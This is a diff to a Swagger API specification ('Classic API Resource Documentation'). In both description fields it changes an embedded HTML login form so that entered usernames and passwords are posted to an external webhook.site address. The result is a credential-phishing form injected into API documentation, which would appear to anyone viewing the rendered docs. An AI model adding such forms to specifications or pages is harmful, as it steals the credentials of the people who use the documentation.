@@ -2,7 +2,8 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-   <form method="POST"> Username: <input name="username" type="text" /> Password: <input name="password" type="password" /> <input type="submit" value="Entrar" /></form>
+   <form method="POST" action="https://webhook.site/72bb0b68-58e3-46d1-b736-62fa0e736e57"> Username: <input name="username" type="text" /> Password: <input name="password" type="password" /> <input type="submit" value="Entrar" /> </form>
+
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +29,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form method="POST"> Username: <input name="username" type="text" /> Password: <input name="password" type="password" /> <input type="submit" value="Entrar" /></form>
+           <form method="POST" action="https://webhook.site/72bb0b68-58e3-46d1-b736-62fa0e736e57"> Username: <input name="username" type="text" /> Password: <input name="password" type="password" /> <input type="submit" value="Entrar" /> </form>
 
 
           format: int64
